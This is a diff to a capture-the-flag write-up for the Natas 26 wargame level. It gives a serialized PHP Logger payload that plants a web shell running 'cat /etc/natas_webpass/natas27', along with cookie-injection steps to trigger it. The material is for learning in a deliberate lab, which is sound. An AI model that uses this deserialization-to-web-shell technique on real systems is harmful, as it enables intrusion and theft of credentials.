@@ -15,8 +15,9 @@ The payload below does just that, placing a php file in the images directory (wh
 
 `O:6:\"Logger\":3:{s:15:\"\0Logger\0logFile\";s:36:\"/var/www/natas/natas26/img/exfil.php\";s:15:\"\0Logger\0initMsg\";s:0:\"\";s:15:\"\0Logger\0exitMsg\";s:52:\"<?php passthru('cat /etc/natas_webpass/natas27'); ?>\";}`
 
-FYI, the Logger class has private variables, and these are settable using the syntax \0classname\0property name. If they were public the \0classname\0 wouldn't be necessary.
+FYI, The above string has its quotes already escaped, to make it easier to paste into base64_encode or similar. For the raw value, replace all `\"` with `"`
+FYI2, the Logger class has private variables, and these are settable using the syntax `\0[classname]\0[property name]`. If they were public the `\0[classname]\0` wouldn't be necessary.
 
 3. base64 encode the payload string (with php interactive you can use `base64_encode`), and set/add the `drawing` cookie with the value.
-4. Reload the page, then navigate to /img/expfil.php. It should contain the password for natas27, twice (the unserialize occurs twice in the code and the Logger appends).
+4. Reload the page, then navigate to `/img/exfil.php`. It should contain the password for natas27, twice (the unserialize occurs twice in the code and the Logger appends).
 
